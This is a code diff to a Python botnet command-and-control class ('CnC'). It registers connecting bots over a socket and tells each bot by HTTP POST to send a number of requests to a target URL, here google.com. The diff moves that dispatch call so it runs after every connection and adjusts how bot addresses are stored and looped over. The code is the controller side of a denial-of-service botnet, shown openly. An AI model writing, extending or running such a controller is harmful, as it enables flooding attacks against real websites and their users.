@@ -20,12 +20,10 @@ class CnC:
 
         while True:
             client, address = self.socket.accept()
-            address = address[0]
             data = client.recv(1024)
             if data == b"new":
                 self.bots.append(address)
                 print(f"bot {address} added")
-                self.send_requests('https://google.com', 3)
             elif data == b"close":
                 try:
                     self.bots.remove(address)
@@ -36,13 +34,14 @@ class CnC:
                 raise RuntimeError("Bot message not recognized")
             client.close()
             print(self.list_clients())
+            self.send_requests('https://google.com', 3)
 
     def send_requests(self, url, n):
         if len(self.bots) == 0:
             raise RuntimeError("No bot connected.")
 
-        for client in self.bots:
-            requests.post(f"http://{client}:80", json={'url': url, 'n': n})
+        for client, _ in self.bots:
+            response = requests.post(f"http://{client}:80", json={'url': url, 'n': n})
 
     def list_clients(self):
         if self.bots:
